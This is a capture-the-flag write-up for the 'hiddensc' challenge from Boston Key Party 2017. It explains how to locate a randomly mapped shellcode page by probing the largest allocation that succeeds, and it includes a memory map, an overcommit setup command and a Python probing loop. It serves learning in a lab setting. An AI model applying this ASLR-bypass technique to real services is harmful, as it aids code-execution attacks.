# hiddensc

```
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

During the competition, I keep thinking how can trigger error such as `double free`, so that the `memory map` returned along with error message will contain the hidden address, but just can't find how to make it work ...  
After the competition, thanks to [this elaborate article](https://github.com/sebel1010/ctf-writeups/blob/master/2017/boston-key-party/hiddensc.md), I knew my original thought was wrong direction XD, and finally figured out this fantastic method ! So I record it here for memory .

## Analyze

This challenge is a fork server, which `mmap` a page of memory to store shellcode, while the address is random .  

And the program provide two features:  

* `[a]lloc` can let us allocate some space and decide whether `free` it right away .  
* `[j]ump` can let us assign an address and jump to it .

So if we know the random address, we can get shell immediately !

## Exploit

> Before doing following work, be sure to do the setting :
> `echo 1 | sudo tee /proc/sys/vm/overcommit_memory`
> This will enable us to allocate huge amount of memory to do the exploit !
> reference :
> [Overcommit and OOM](http://www.win.tue.nl/~aeb/linux/lk/lk-9.html#ss9.6)
> [overcommit document](https://www.kernel.org/doc/Documentation/vm/overcommit-accounting)

By observation, when we allocating huge size of memory, the allocated space may locate at :

* **before the page storing shellcode**
* after the shellcode page and before code segment
* between heap and some libraries

```
    Start Addr           End Addr       Size     Offset objfile
 0x651af4d0000     0x4e51af4d6000 0x480000006000        0x0
0x4e51af4d6000     0x4e51af4d7000     0x1000        0x0 /root/CTF/bostonKeyParty2017/hiddensc/poop.sc
0x5220d8d33000     0x5620d8d34000 0x40000001000        0x0
0x5620d8d34000     0x5620d8d36000     0x2000        0x0 /root/CTF/bostonKeyParty2017/hiddensc/hiddensc
0x5620d8f36000     0x5620d8f37000     0x1000     0x2000 /root/CTF/bostonKeyParty2017/hiddensc/hiddensc
0x5620d8f37000     0x5620d8f38000     0x1000     0x3000 /root/CTF/bostonKeyParty2017/hiddensc/hiddensc
0x5620d95e5000     0x5620d9606000    0x21000        0x0 [heap]
0x5777b8000000     0x5777b8021000    0x21000        0x0
0x5777b8021000     0x5777bc000000  0x3fdf000        0x0
0x5777bd48e000     0x7f77bd490000 0x280000002000        0x0
0x7f77bd490000     0x7f77bd49b000     0xb000        0x0 /root/glibc-2.19/64/lib/libnss_files-2.19.so
0x7f77bd49b000     0x7f77bd69a000   0x1ff000     0xb000 /root/glibc-2.19/64/lib/libnss_files-2.19.so
...
```

**If before the page storing shellcode has biggest space**, in above case, 0x4e51af4d6000 bytes, we can use following method to get the random address !  

Keep `malloc` and `free` right away with increased size. When the `FAIL`  message returned to us, increase size with smaller scale each time and keep doing the `malloc` and `free` work .  
After we can't increase the size anymore, we can deduce that the size of allocated space is the random address where the shellcode is located, at least not far away.  
This is because with the biggest possible allocated request, only the biggest continuous space can handle, and this is why the prerequisite exist !

```python
for i in range(11, 2, -1):
    for j in range(16):
        size += (1 << 4*i)
        print 'try malloc({})'.format(hex(size))
        if not alloc(size):
            size -= (1 << 4*i)
            break
```


